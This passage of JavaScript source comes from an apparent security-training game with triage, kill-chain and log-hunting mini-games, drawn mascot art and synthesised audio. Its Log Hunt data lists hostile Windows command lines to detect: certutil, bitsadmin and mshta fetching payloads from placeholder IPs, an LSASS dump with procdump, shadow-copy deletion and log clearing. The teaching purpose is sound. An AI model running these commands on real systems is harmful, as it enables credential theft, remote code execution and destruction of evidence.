    else { lives--; oops++; fx.push({x:mx,y:my,e:"bad",a:1}); msg(`You blocked "${p.lab}". That was legit traffic!`); blip(200); } });
  function finish(){ over=true; cancelAnimationFrame(raf);
    done(score+lives*25,`Blocked <b>${caught}</b> malicious packets · <b>${leaked}</b> got through · <b>${oops}</b> legit packets blocked by mistake. ${lives>0?"Survived with "+lives+" (+"+lives*25+")":"Server down, but you fought well."}`); }
  raf=requestAnimationFrame(frame);
  return {stop(){ over=true; cancelAnimationFrame(raf); }};
}

/* ---------- 2. Triage Rush ---------- */
const TR_ACT=["Close (FP)","Escalate","Contain now"];
const TR_POOL=[
 {a:"4625 x 3,200 in 5 min · account svc_backup · source BACKUP-01 · password expired yesterday",k:0,w:"Expired service-account password on a known backup server. Fix the password, close."},
 {a:"WINWORD.EXE → powershell.exe -nop -w hidden -enc … · outbound to an unknown IP right after",k:2,w:"Malicious document executing and calling out. Isolate now."},
 {a:"Impossible travel: Singapore → Frankfurt in 9 min · both logins from the corporate VPN client",k:0,w:"VPN egress changed country; the user didn't. Classic geo false positive."},
 {a:"vssadmin delete shadows /all /quiet on FILESRV-02 · files being renamed to .locked",k:2,w:"Ransomware in progress. Contain immediately; minutes matter."},
 {a:"New local admin account 'support_tmp' created on a workstation at 02:14 by a helpdesk account",k:1,w:"Suspicious but needs context (change ticket? who was on shift?). Escalate."},
 {a:"DNS spike to *.windowsupdate.com from 400 hosts on Patch Tuesday evening",k:0,w:"It's Patch Tuesday. Everyone is downloading updates."},
 {a:"rundll32 loading C:\\ProgramData\\a.dll, beaconing every 60s exactly to a 2-day-old domain",k:2,w:"Perfectly timed beacon from a DLL in ProgramData to a brand-new domain = active C2."},
 {a:"User reported phish · link not clicked (proxy shows no visit) · sender spoofed CEO",k:1,w:"No compromise yet, but a CEO-spoof campaign needs a wider look: escalate to purge and block."},
 {a:"EDR: procdump.exe -ma lsass.exe on a domain controller",k:2,w:"Credential dumping on a DC is as bad as it gets. Contain and start IR."},
 {a:"4740 lockout for m.lee · source: her phone (ActiveSync) · she changed her password at 09:00",k:0,w:"Old password still saved on her phone. The most common lockout ever."},
 {a:"Audit log cleared (1102) on HR-FS01 by an account that never logs in interactively",k:1,w:"Strong red flag, but scope it first: escalate for investigation right away."},
 {a:"Vulnerability scanner 10.0.5.20 port-scanning the server VLAN during its scheduled window",k:0,w:"Your own scanner, on schedule. Close (and maybe tag it so it stops alerting)."},
 {a:"Okta: MFA push approved after 14 denied pushes in 3 minutes, new device from abroad",k:2,w:"MFA fatigue success. Revoke sessions and lock the account now."},
 {a:"certutil.exe -urlcache -f http://… downloading an .exe to C:\\Users\\Public",k:2,w:"certutil used as a downloader into a public folder: hands-on-keyboard attacker. Contain."},
 {a:"Large upload (2 GB) to a personal cloud drive from a finance laptop, user resigned last week",k:1,w:"Possible insider data theft. Needs HR/legal context: escalate, don't contain blindly."},
 {a:"PowerShell script block: Get-ADUser -Filter * run by an IT admin from the admin jump host",k:0,w:"Normal admin activity from the right place by the right person."}];
function gameTR(r,done){
  const list=shuffleR(TR_POOL,r); let i=0, score=0, streak=0, right=0, wrong=0, over=false;
  $("#gameArea").innerHTML=hud([["score","trS",0],["streak","trK","x1"],["time","trT",60]])+`<div class="alertcard" id="trA"></div>
    <div class="tracts">${TR_ACT.map((a,k)=>`<button class="ffb" data-k="${k}">${a}</button>`).join("")}</div><div class="u38 small" id="trW"></div>`;
  const show=()=>{ $("#trA").innerHTML=`<div class="small">ALERT ${i+1}/${list.length}</div><div class="u39">${esc(list[i].a)}</div>`; };
  show();
  $("#gameArea").querySelector(".tracts").onclick=e=>{ const b=e.target.closest("[data-k]"); if(!b||over) return; const q=list[i], ok=+b.dataset.k===q.k;
    if(ok){ streak++; right++; score+=100+Math.min(streak,6)*20; blip(880); } else { streak=0; wrong++; score-=50; blip(220); }
    $("#trW").innerHTML=`${ok?"":"Should be <b>"+esc(TR_ACT[q.k])+"</b>."} ${esc(q.w)}`;
    $("#trS").textContent=score; $("#trK").textContent="x"+(1+Math.min(streak,6)*0.2).toFixed(1);
    i++; if(i>=list.length){ finish(); } else show(); };
  let left=60; const stopT=timer(60,l=>{ left=l; const el=$("#trT"); if(el) el.textContent=l.toFixed(0); },()=>finish());
  function finish(){ if(over) return; over=true; stopT(); const bonus=i>=list.length?Math.round(left*10):0;
    done(score+bonus,`<b>${right}</b> right, <b>${wrong}</b> wrong out of ${i} alerts.${bonus?` Cleared the queue early: +${bonus} time bonus.`:""} Remember: contain when it's active and spreading, escalate when it needs context.`); }
  return {stop(){ over=true; stopT(); }};
}

/* ---------- 3. Kill Chain ---------- */
const KC_SCEN=[
 {n:"Ransomware via phishing",s:[["Initial Access","User opens an ISO attachment from a phishing email"],["Execution","A hidden PowerShell command runs from the shortcut inside"],["Persistence","A scheduled task named 'OneDriveSync' is created"],["Credential Access","LSASS memory is dumped"],["Lateral Movement","Attacker RDPs to the file server with stolen credentials"],["Impact","Files are encrypted and shadow copies deleted"]]},
 {n:"Edge device to data theft",s:[["Initial Access","Unpatched VPN appliance is exploited"],["Discovery","Active Directory is queried for Domain Admins"],["Credential Access","Service accounts are Kerberoasted"],["Lateral Movement","PsExec is used to reach the database server"],["Collection","The database is dumped and zipped"],["Exfiltration","The archive is uploaded to cloud storage"]]},
 {n:"Poisoned software update",s:[["Initial Access","A trojanised vendor update is installed"],["Execution","The update's DLL runs at startup"],["Command and Control","It beacons to the attacker's domain every 60s"],["Discovery","The attacker enumerates mail servers"],["Collection","Executives' mailboxes are collected"],["Exfiltration","Mail is exported over HTTPS"]]},
 {n:"Stolen login, cloud wipe",s:[["Credential Access","An infostealer grabs saved browser passwords"],["Initial Access","The attacker logs in to the VPN with them"],["Persistence","A new MFA device is registered on the account"],["Privilege Escalation","The account is added to a privileged group"],["Defense Evasion","Audit logs are cleared"],["Impact","Backups are deleted"]]}];
function gameKC(r,done){
  const scen=shuffleR(KC_SCEN,r).slice(0,3); let round=0, score=0, mistakes=0, over=false, step=0, rStart=0, order=[];
  function load(){ const sc=scen[round]; step=0; rStart=performance.now(); order=shuffleR(sc.s.map((x,k)=>k),r);
    $("#gameArea").innerHTML=hud([["score","kcS",score],["story","kcR",`${round+1}/3`],["misses","kcM",mistakes]])+
      `<div class="u40">Story: ${esc(sc.n)} <span class="small">· click the steps in order</span></div>
       <div class="kcgrid">${order.map(k=>`<button class="kcard" data-k="${k}"><span class="small">${esc(sc.s[k][0])}</span><br>${esc(sc.s[k][1])}</button>`).join("")}</div>
       <div class="u41 small" id="kcMsg"></div>`;
    $("#gameArea").querySelector(".kcgrid").onclick=click; }
  function click(e){ const b=e.target.closest("[data-k]"); if(!b||over||b.disabled) return; const k=+b.dataset.k;
    if(k===step){ b.disabled=true; b.classList.add("ok"); b.insertAdjacentHTML("afterbegin",`<span class="kcn">${step+1}</span>`); step++; blip(700+step*40);
      if(step===6){ const secs=(performance.now()-rStart)/1000, pts=Math.max(200,Math.round(1000-secs*15)); score+=pts; $("#kcMsg").textContent=`Chain complete! +${pts}`;
        round++; setTimeout(()=>{ if(over) return; if(round<3) load(); else { over=true; done(score-mistakes*100,`Rebuilt 3 attack chains with <b>${mistakes}</b> wrong clicks (−${mistakes*100}). Knowing the order is how you know what to look for next.`); } },700); } }
    else { mistakes++; score; b.classList.remove("shake"); void b.offsetWidth; b.classList.add("shake"); blip(200); $("#kcM").textContent=mistakes; $("#kcMsg").textContent="Not yet: what has to happen before that?"; }
    $("#kcS").textContent=score; }
  load(); return {stop(){ over=true; }};
}

/* ---------- 4. Log Hunt ---------- */
const LH_GOOD=[String.raw`C:\Windows\System32\svchost.exe -k netsvcs -p`,String.raw`"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer`,String.raw`C:\Windows\explorer.exe`,
 String.raw`"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"`,String.raw`C:\Windows\System32\taskhostw.exe`,String.raw`"C:\Program Files\Windows Defender\MsMpEng.exe"`,
 String.raw`C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding`,String.raw`C:\Windows\System32\gpupdate.exe /target:computer`,String.raw`C:\Windows\System32\spoolsv.exe`,
 String.raw`"C:\Program Files\7-Zip\7z.exe" a C:\Users\m.lee\Documents\report.zip report.docx`,String.raw`C:\Windows\System32\SearchIndexer.exe /Embedding`,
 String.raw`"C:\Program Files\BackupAgent\agent.exe" --scheduled-full`,String.raw`C:\Windows\System32\notepad.exe C:\Users\j.tan\Desktop\todo.txt`];
const LH_BAD=[
 [String.raw`powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=`,"Hidden window + encoded command: PowerShell trying not to be read."],
 [String.raw`certutil.exe -urlcache -split -f http://203.0.113.7/a.txt C:\Users\Public\a.exe`,"certutil abused as a downloader (a classic LOLBin)."],
 [String.raw`rundll32.exe C:\Users\Public\update.dll,Start`,"Running a DLL from a user-writable public folder."],
 [String.raw`vssadmin.exe delete shadows /all /quiet`,"Deleting shadow copies: ransomware preparing to encrypt."],
 [String.raw`procdump.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`,"Dumping LSASS memory to steal credentials."],
 [String.raw`mshta.exe http://198.51.100.23/invoice.hta`,"mshta running a remote HTA file: script execution from the internet."],
 [String.raw`schtasks.exe /create /tn "Updater" /tr C:\ProgramData\u.exe /sc minute /mo 5`,"Persistence: a task running a ProgramData binary every 5 minutes."],
 [String.raw`wevtutil.exe cl Security`,"Clearing the Security event log to hide tracks."],
 [String.raw`bitsadmin.exe /transfer j http://203.0.113.9/p.exe C:\Users\Public\p.exe`,"BITS abused to download a payload."],
 [String.raw`net.exe localgroup administrators svc_helper /add`,"Adding an account to local Administrators."],
 [String.raw`bcdedit.exe /set {default} recoveryenabled no`,"Disabling Windows recovery: another ransomware prep step."]];
function gameLH(r,done){
  let round=0, score=0, found=0, wrongs=0, over=false, rStart=0, need=0, got=0;
  function load(){ const nb=r()<0.5?1:2; const bads=shuffleR(LH_BAD,r).slice(0,nb), goods=shuffleR(LH_GOOD,r).slice(0,10-nb);
    const lines=shuffleR(bads.map(b=>({c:b[0],w:b[1],bad:true})).concat(goods.map(g=>({c:g,bad:false}))),r); need=nb; got=0; rStart=performance.now();
    $("#gameArea").innerHTML=hud([["score","lhS",score],["round","lhR",`${round+1}/5`],["found","lhN",`0/${nb}`]])+
      `<div class="u42 small">Process creation logs · host WS-${String(Math.floor(r()*90)+10)} · find the ${nb} malicious line${nb>1?"s":""}</div>
       <div id="lhL">${lines.map((l,k)=>`<div class="logline" data-k="${k}"><span class="small">${String(8+Math.floor(r()*14)).padStart(2,"0")}:${String(Math.floor(r()*60)).padStart(2,"0")}</span> ${esc(l.c)}</div>`).join("")}</div>
       <div class="u43 small" id="lhW"></div>`;
    $("#lhL").onclick=e=>{ const el=e.target.closest(".logline"); if(!el||over||el.dataset.done) return; const l=lines[+el.dataset.k]; el.dataset.done="1";
      if(l.bad){ el.classList.add("hit"); score+=200; found++; got++; blip(820); $("#lhW").textContent=""+l.w; $("#lhN").textContent=`${got}/${need}`;
        if(got===need){ const secs=(performance.now()-rStart)/1000, bonus=Math.max(0,Math.round(300-secs*20)); score+=bonus; round++;
          setTimeout(()=>{ if(over) return; if(round<5) load(); else { over=true; done(score,`Found <b>${found}</b> malicious lines with <b>${wrongs}</b> wrong clicks. These are real attacker habits: LOLBins, user-writable paths, log clearing and shadow-copy deletion.`); } },900); } }
      else { el.classList.add("miss"); score-=100; wrongs++; blip(200); $("#lhW").textContent="That one's normal Windows/user activity."; }
      $("#lhS").textContent=score; }; }
  load(); return {stop(){ over=true; }};
}

/* ======================= v6 REDESIGN LAYER =======================
   Function declarations here are hoisted and replace the older versions above,
   so every caller (and the v5 wrappers) uses these. No emojis: SVG icons and drawn art only. */
const RM=window.matchMedia&&window.matchMedia("(prefers-reduced-motion: reduce)").matches;
function ic(n,cls){ return `<svg class="ic ${cls||""}" aria-hidden="true"><use href="#i-${n}"/></svg>`; }
function toast(msg){ const t=$("#toast"); t.textContent=String(msg).replace(/\s{2,}/g," ").trim(); t.classList.add("show"); clearTimeout(t._h); t._h=setTimeout(()=>t.classList.remove("show"),4200); }
function hud(items){ return `<div class="hud">${items.map(([l,id,v])=>`<span>${esc(l)} <b id="${id}">${v}</b></span>`).join("")}</div>`; }

/* ---------- drawn art: buddies, hats, shop items ---------- */
const BODY={cat:"#8C95B2",owl:"#8B6A4E",fox:"#E07A3A",panda:"#F1ECE2"};
function eyes(kind,mood){
  const L=kind==="owl"?28:30, R=kind==="owl"?52:50, y=kind==="owl"?42:44;
  if(mood==="sleepy") return `<path d="M${L-5} ${y}q5 3 10 0M${R-5} ${y}q5 3 10 0" stroke="#1B1F2B" stroke-width="2.4" fill="none" stroke-linecap="round"/>`;
  if(mood==="happy") return `<path d="M${L-5} ${y+1}q5-6 10 0M${R-5} ${y+1}q5-6 10 0" stroke="#1B1F2B" stroke-width="2.4" fill="none" stroke-linecap="round"/>`;
  if(kind==="owl") return `<circle cx="${L}" cy="${y}" r="8" fill="#FFF6E5"/><circle cx="${R}" cy="${y}" r="8" fill="#FFF6E5"/><circle cx="${L+1}" cy="${y}" r="4" fill="#1B1F2B"/><circle cx="${R-1}" cy="${y}" r="4" fill="#1B1F2B"/>`;
  if(kind==="cat") return `<ellipse cx="${L}" cy="${y}" rx="4.5" ry="5.5" fill="#F5B841"/><ellipse cx="${R}" cy="${y}" rx="4.5" ry="5.5" fill="#F5B841"/><ellipse cx="${L}" cy="${y}" rx="1.4" ry="4.2" fill="#1B1F2B"/><ellipse cx="${R}" cy="${y}" rx="1.4" ry="4.2" fill="#1B1F2B"/>`;
  const sad=mood==="sad"?`<path d="M${L-6} ${y-8}l8 3M${R+6} ${y-8}l-8 3" stroke="#1B1F2B" stroke-width="2" stroke-linecap="round"/>`:"";
  return `${sad}<circle cx="${L}" cy="${y}" r="3.6" fill="#1B1F2B"/><circle cx="${R}" cy="${y}" r="3.6" fill="#1B1F2B"/><circle cx="${L+1.2}" cy="${y-1.2}" r="1.1" fill="#fff"/><circle cx="${R+1.2}" cy="${y-1.2}" r="1.1" fill="#fff"/>`;
}
function hatArt(id){ switch(id){
  case "cap": return `<path d="M21 27Q40 4 59 27Z" fill="#5CE1C6"/><path d="M52 25l17 3-17 2z" fill="#2F8F7D"/><circle cx="40" cy="12" r="2" fill="#2F8F7D"/>`;
  case "shades": return `<rect x="21" y="38" width="16" height="10" rx="3" fill="#14161C"/><rect x="43" y="38" width="16" height="10" rx="3" fill="#14161C"/><path d="M37 42h6" stroke="#14161C" stroke-width="2.5"/><path d="M24 40l5 0" stroke="#ffffff55" stroke-width="1.5"/>`;
  case "tophat": return `<rect x="29" y="0" width="22" height="22" rx="2" fill="#1C1F27"/><rect x="29" y="15" width="22" height="4" fill="#E8505B"/><rect x="22" y="20" width="36" height="5" rx="2" fill="#1C1F27"/>`;
  case "phones": return `<path d="M17 44A23 23 0 0 1 63 44" stroke="#2A2E3A" stroke-width="5" fill="none"/><rect x="11" y="38" width="10" height="16" rx="4" fill="#E8505B"/><rect x="59" y="38" width="10" height="16" rx="4" fill="#E8505B"/>`;
  case "helmet": return `<path d="M16 31Q40-2 64 31Z" fill="#F5B841"/><rect x="14" y="29" width="52" height="5" rx="2" fill="#C98F1E"/><circle cx="40" cy="17" r="5" fill="#FFF3C4" stroke="#C98F1E" stroke-width="2"/>`;
  case "grad": return `<path d="M24 22h32v6H24z" fill="#1C1F27"/><path d="M40 6l26 9-26 9-26-9z" fill="#262A35"/><path d="M60 15v12" stroke="#F5B841" stroke-width="2"/><circle cx="60" cy="28" r="2.5" fill="#F5B841"/>`;
  case "crown": return `<path d="M24 26V10l8 8 8-12 8 12 8-8v16z" fill="#F5B841" stroke="#C98F1E" stroke-width="1.5" stroke-linejoin="round"/><circle cx="40" cy="19" r="2.5" fill="#E8505B"/>`;
  default: return ""; } }
function mascot(kind,hat,mood){
  const c=BODY[kind]||BODY.cat; let ears="", face="";
  if(kind==="cat"){ ears=`<path d="M18 34L21 12 36 24Z" fill="${c}"/><path d="M62 34L59 12 44 24Z" fill="${c}"/><path d="M22 28l1.5-9 7 6z" fill="#E8A0A8"/><path d="M58 28l-1.5-9-7 6z" fill="#E8A0A8"/>`;
    face=`<path d="M38 51h4l-2 2.5z" fill="#E8A0A8"/><path d="M36 55q2 2 4 0q2 2 4 0" stroke="#1B1F2B" stroke-width="1.5" fill="none" stroke-linecap="round"/><path d="M14 50l10 1M14 55l10-1M66 50l-10 1M66 55l-10-1" stroke="#ffffff88" stroke-width="1"/>`; }
  if(kind==="owl"){ ears=`<path d="M20 26l2-12 10 8z" fill="#6E5139"/><path d="M60 26l-2-12-10 8z" fill="#6E5139"/>`;
    face=`<circle cx="28" cy="42" r="11" fill="#C9A77F"/><circle cx="52" cy="42" r="11" fill="#C9A77F"/><path d="M37 49l3 6 3-6z" fill="#F5B841"/><path d="M26 62q4 3 8 0q3 3 6 0q3 3 6 0q4 3 8 0" stroke="#6E5139" stroke-width="1.6" fill="none"/>`; }
  if(kind==="fox"){ ears=`<path d="M16 34L19 8 36 24Z" fill="${c}"/><path d="M64 34L61 8 44 24Z" fill="${c}"/><path d="M19 8l2 10 5-4z" fill="#2A1A12"/><path d="M61 8l-2 10-5-4z" fill="#2A1A12"/>`;
    face=`<path d="M17 50Q40 76 63 50Q52 58 40 58Q28 58 17 50Z" fill="#F4EDE0"/><ellipse cx="40" cy="55" rx="3.2" ry="2.4" fill="#1B1F2B"/>`; }
  if(kind==="panda"){ ears=`<circle cx="21" cy="24" r="8" fill="#1F2229"/><circle cx="59" cy="24" r="8" fill="#1F2229"/>`;
    face=`<ellipse cx="30" cy="45" rx="7" ry="9" transform="rotate(-25 30 45)" fill="#1F2229"/><ellipse cx="50" cy="45" rx="7" ry="9" transform="rotate(25 50 45)" fill="#1F2229"/><ellipse cx="40" cy="55" rx="3.5" ry="2.4" fill="#1F2229"/>`; }
  let ey=eyes(kind,mood); if(kind==="panda") ey=ey.replace(/#1B1F2B/g,"#F1ECE2").replace(/fill="#fff"/g,'fill="#1F2229"');
  const mouth=mood==="sad"?`<path d="M35 62q5-4 10 0" stroke="#1B1F2B" stroke-width="1.6" fill="none" stroke-linecap="round"/>`:"";
  return `<svg viewBox="0 0 80 80" aria-hidden="true"><ellipse cx="40" cy="76" rx="20" ry="3" fill="#0006"/>${ears}<circle cx="40" cy="46" r="26" fill="${c}"/>${face}${ey}${mouth}${hat?hatArt(hat):""}</svg>`;
}
function itemArt(id){
  const hats=["cap","shades","tophat","phones","helmet","grad","crown"];
  if(hats.includes(id)) return `<svg viewBox="6 -4 68 64"><circle cx="40" cy="46" r="26" fill="#2A3350"/>${hatArt(id)}</svg>`;
  const A={
    coral:`<svg viewBox="0 0 60 60"><path d="M30 58V30M30 40l-12-12M18 28V14M30 34l12-14M42 20V8M30 46l14-6" stroke="#F2946B" stroke-width="5" stroke-linecap="round" fill="none"/></svg>`,
    castle:`<svg viewBox="0 0 60 60"><path d="M8 58V24h8v6h6v-6h16v6h6v-6h8v34z" fill="#8D93A8"/><path d="M24 58V44a6 6 0 0 1 12 0v14z" fill="#10162A"/><path d="M30 24V8l10 4-10 4" fill="#E8505B"/></svg>`,
    chest:`<svg viewBox="0 0 60 60"><path d="M8 28h44v26H8z" fill="#8B5A2B"/><path d="M8 28a22 14 0 0 1 44 0z" fill="#A56B33"/><path d="M8 32h44" stroke="#F5B841" stroke-width="3"/><rect x="26" y="30" width="8" height="10" rx="1" fill="#F5B841"/><path d="M45 14l2 5 5 2-5 2-2 5-2-5-5-2 5-2z" fill="#5CE1C6"/></svg>`,
    octo:`<svg viewBox="0 0 60 60"><path d="M12 46c0-8 4-10 4-22a14 14 0 0 1 28 0c0 12 4 14 4 22" fill="#B07BD8"/><path d="M14 46c-2 6 4 8 6 2M24 48c-1 6 5 6 5 0M34 48c0 6 6 6 5 0M44 46c2 6 8 4 4-2" stroke="#B07BD8" stroke-width="4" fill="none" stroke-linecap="round"/><circle cx="24" cy="26" r="3" fill="#1B1F2B"/><circle cx="36" cy="26" r="3" fill="#1B1F2B"/><rect x="20" y="22" width="20" height="8" rx="2" fill="none" stroke="#5CE1C6" stroke-width="1.5"/></svg>`,
    shark:`<svg viewBox="0 0 60 60"><path d="M4 34Q24 18 46 30l10-8-2 12 2 12-10-8Q24 46 4 34z" fill="#E8505B"/><path d="M24 24l6-12 4 14z" fill="#B53A43"/><circle cx="12" cy="32" r="1.8" fill="#1B1F2B"/><path d="M10 38l8 0" stroke="#fff" stroke-width="1.5" stroke-dasharray="2 1.5"/></svg>`,
    coffee:`<svg viewBox="0 0 60 60"><path d="M12 22h30v16a12 12 0 0 1-12 12h-6a12 12 0 0 1-12-12z" fill="#EDE6D6"/><path d="M42 26h4a6 6 0 0 1 0 12h-4" stroke="#EDE6D6" stroke-width="4" fill="none"/><path d="M14 24h26" stroke="#6B4423" stroke-width="4"/><path d="M22 6c0 5 4 5 4 10M30 6c0 5 4 5 4 10" stroke="#8D93A8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>`,
    onigiri:`<svg viewBox="0 0 60 60"><path d="M30 6Q36 6 50 38Q54 50 42 50H18Q6 50 10 38Q24 6 30 6z" fill="#F7F4EC"/><rect x="20" y="36" width="20" height="14" fill="#1F3A2E"/></svg>`,
    donut:`<svg viewBox="0 0 60 60"><circle cx="30" cy="30" r="22" fill="#D6A05A"/><path d="M10 28a20 20 0 0 1 40 0c-2 6-6 2-8 6s-6 0-8 4-6-2-8 2-6-2-8 0-6-6-8-12z" fill="#F08BB4"/><circle cx="30" cy="30" r="7" fill="#10162A"/><path d="M20 20l3 1M36 16l1 3M42 26l3-1M24 32l2 2" stroke="#5CE1C6" stroke-width="2" stroke-linecap="round"/></svg>`};
  return A[id]||"";
}
const DECOR_IMG={};
function decorImg(id){ if(!DECOR_IMG[id]){ const im=new Image(); im.src="data:image/svg+xml;utf8,"+encodeURIComponent(itemArt(id).replace("<svg ",'<svg xmlns="http://www.w3.org/2000/svg" ')); DECOR_IMG[id]=im; } return DECOR_IMG[id]; }
function drawDecor(t){ const y=H-62, s=56;
  const put=(id,x,dy)=>{ const im=decorImg(id); if(im.complete&&im.naturalWidth) cx.drawImage(im,x-s/2,y+(dy||0),s,s); };
  if(owns("coral")){ put("coral",W*0.08); put("coral",W*0.55,6); }
  if(owns("castle")) put("castle",W*0.26);
  if(owns("chest")) put("chest",W*0.71,4);
  if(owns("octo")) put("octo",W*0.88,Math.sin(t/600)*5-4); }

/* ---------- sound: everything synthesised, nothing streamed ---------- */
const Snd={ctx:null,master:null,fx:null,vol:(Number(store.get("vol",60))||60)/100,sfx:store.get("sfx",true)!==false,ch:{},timers:{}};
function sndInit(){ if(Snd.ctx) return Snd.ctx; if(!Snd.armed) return null; try{ const C=window.AudioContext||window.webkitAudioContext; if(!C) return null; Snd.ctx=new C();
  Snd.master=Snd.ctx.createGain(); Snd.master.gain.value=Snd.vol; Snd.master.connect(Snd.ctx.destination);
  Snd.fx=Snd.ctx.createGain(); Snd.fx.gain.value=.7; Snd.fx.connect(Snd.master); return Snd.ctx; }catch(e){ return null; } }
function noiseBuf(kind,secs){ const c=Snd.ctx, b=c.createBuffer(1,c.sampleRate*secs,c.sampleRate), d=b.getChannelData(0); let l=0,p=[0,0,0];
  for(let i=0;i<d.length;i++){ const w=Math.random()*2-1;
    if(kind==="brown"){ l=(l+0.02*w)/1.02; d[i]=l*3.5; } else if(kind==="pink"){ p[0]=.99*p[0]+w*.05; p[1]=.96*p[1]+w*.2; p[2]=.57*p[2]+w*.7; d[i]=(p[0]+p[1]+p[2]+w*.1)*.25; } else d[i]=w; }
  return b; }
function env(g,t,a,peak,dec){ g.gain.setValueAtTime(0.0001,t); g.gain.exponentialRampToValueAtTime(peak,t+a); g.gain.exponentialRampToValueAtTime(0.0001,t+a+dec); }
function tone(type,f0,f1,dur,peak,dest,when){ const c=Snd.ctx, t=(when||c.currentTime), o=c.createOscillator(), g=c.createGain();
  o.type=type; o.frequency.setValueAtTime(f0,t); if(f1) o.frequency.exponentialRampToValueAtTime(f1,t+dur); env(g,t,.005,peak,dur); o.connect(g).connect(dest||Snd.fx); o.start(t); o.stop(t+dur+.05); }
function burst(freq,q,dur,peak,dest,when,type){ const c=Snd.ctx, t=(when||c.currentTime), s=c.createBufferSource(); s.buffer=Snd.white||(Snd.white=noiseBuf("white",1));
  const f=c.createBiquadFilter(); f.type=type||"bandpass"; f.frequency.value=freq; f.Q.value=q; const g=c.createGain(); env(g,t,.002,peak,dur);
  s.connect(f).connect(g).connect(dest||Snd.fx); s.start(t,Math.random()*.5); s.stop(t+dur+.03); }
function sfx(name){ if(!Snd.sfx||!sndInit()) return; const c=Snd.ctx; if(c.state==="suspended") c.resume(); const t=c.currentTime;
  switch(name){
    case "tick": burst(3200,1.2,.018,.25); break;
    case "pop": tone("sine",700,170,.08,.35); burst(1800,2,.02,.12); break;
    case "chime": tone("sine",880,null,.25,.18); tone("sine",1318.5,null,.35,.14,null,t+.08); break;
    case "thud": tone("sine",150,55,.18,.45); burst(400,1,.06,.2,null,null,"lowpass"); break;
    case "coin": tone("triangle",987.8,null,.08,.16); tone("triangle",1318.5,null,.22,.16,null,t+.07); break;
    case "pager": for(let i=0;i<2;i++){ tone("square",2350,null,.09,.05,null,t+i*.16); } break;
    case "clack": burst(1700+Math.random()*900,3,.012,.18); break;
    case "whoosh": { const s=c.createBufferSource(); s.buffer=Snd.white||(Snd.white=noiseBuf("white",1)); const f=c.createBiquadFilter(); f.type="bandpass"; f.Q.value=1.4;
      f.frequency.setValueAtTime(300,t); f.frequency.exponentialRampToValueAtTime(2400,t+.22); const g=c.createGain(); env(g,t,.05,.18,.2); s.connect(f).connect(g).connect(Snd.fx); s.start(t); s.stop(t+.3); break; }
    case "smash": tone("sawtooth",120,40,.25,.25); burst(900,.7,.25,.4); break;
  } }
function clatter(ms){ if(!Snd.sfx||!sndInit()) return; const c=Snd.ctx, t0=c.currentTime, n=Math.min(90,Math.round(ms/14));
  for(let i=0;i<n;i++) burst(1500+Math.random()*1400,3,.01,.06+Math.random()*.08,null,t0+i*(ms/1000/n)+Math.random()*.01); }
function blip(f=660){ sfx(f>=850?"chime":f<=260?"thud":"pop"); }

function chGain(name){ if(!Snd.ch[name]){ const g=Snd.ctx.createGain(); g.gain.value=0.0001; g.connect(Snd.master); Snd.ch[name]={g,started:false}; } return Snd.ch[name]; }
function startHum(ch){ const c=Snd.ctx, s=c.createBufferSource(); s.buffer=noiseBuf("brown",6); s.loop=true; const lp=c.createBiquadFilter(); lp.type="lowpass"; lp.frequency.value=360;
  s.connect(lp).connect(ch.g); s.start(); const o=c.createOscillator(), og=c.createGain(); o.frequency.value=100; og.gain.value=.025; o.connect(og).connect(ch.g); o.start(); }
function startRain(ch){ const c=Snd.ctx, s=c.createBufferSource(); s.buffer=noiseBuf("pink",6); s.loop=true; const bp=c.createBiquadFilter(); bp.type="highpass"; bp.frequency.value=500;
  const lp=c.createBiquadFilter(); lp.type="lowpass"; lp.frequency.value=5200; const g=c.createGain(); g.gain.value=.55; s.connect(bp).connect(lp).connect(g).connect(ch.g); s.start();
  Snd.timers.rain=setInterval(()=>{ if(!Snd.on||!Snd.on.rain) return; const t=c.currentTime; for(let i=0;i<3;i++) if(Math.random()<.7) burst(2500+Math.random()*4000,6,.008,.05+Math.random()*.09,ch.g,t+Math.random()*.1); },110); }
const LOFI_CHORDS=[[53,57,60,64],[52,55,59,62],[50,53,57,60],[48,52,55,59]]; // Fmaj7, Em7, Dm7, Cmaj7 (MIDI)
const mtof=m=>440*Math.pow(2,(m-69)/12);
function startLofi(ch){ const c=Snd.ctx, beat=60/72; let next=c.currentTime+.1, step=0;
  const lp=c.createBiquadFilter(); lp.type="lowpass"; lp.frequency.value=1100; lp.Q.value=.5; lp.connect(ch.g);
  const crack=c.createBufferSource(); crack.buffer=noiseBuf("white",3); crack.loop=true; const cf=c.createBiquadFilter(); cf.type="highpass"; cf.frequency.value=3000; const cg=c.createGain(); cg.gain.value=.012; crack.connect(cf).connect(cg).connect(ch.g); crack.start();
  Snd.timers.lofi=setInterval(()=>{ while(next<c.currentTime+.4){ const bar=Math.floor(step/8), ch8=step%8, chord=LOFI_CHORDS[bar%4];
      if(ch8===0) chord.forEach((m,i)=>{ ["triangle","sine"].forEach((ty,k)=>{ const o=c.createOscillator(), g=c.createGain(); o.type=ty; o.frequency.value=mtof(m); o.detune.value=k?7:-5;
        g.gain.setValueAtTime(0.0001,next+i*.03); g.gain.exponentialRampToValueAtTime(.05,next+i*.03+.25); g.gain.exponentialRampToValueAtTime(.0001,next+beat*7.6); o.connect(g).connect(lp); o.start(next+i*.03); o.stop(next+beat*8); }); });
      if(ch8%4===0) tone("sine",110,45,.25,.32,ch.g,next);
      if(ch8%2===1) burst(8000,1,.04,.05,ch.g,next+.02,"highpass");
      if(ch8===4||ch8===7&&Math.random()<.5){ const m=chord[Math.floor(Math.random()*4)]+12; tone("sine",mtof(m),null,.5,.03,lp,next); }
      if(Math.random()<.3) burst(1800,8,.004,.04,ch.g,next+Math.random()*beat);
      next+=beat; step++; } },100); }
Snd.on={hum:false,rain:false,lofi:false};
["pointerdown","keydown"].forEach(ev=>window.addEventListener(ev,()=>{ Snd.armed=true; },{once:true,capture:true}));
function setChannel(name,on){ if(!sndInit()) { toast("Audio isn't available in this browser."); return; } if(Snd.ctx.state==="suspended") Snd.ctx.resume();
  const ch=chGain(name); if(on&&!ch.started){ ({hum:startHum,rain:startRain,lofi:startLofi})[name](ch); ch.started=true; }
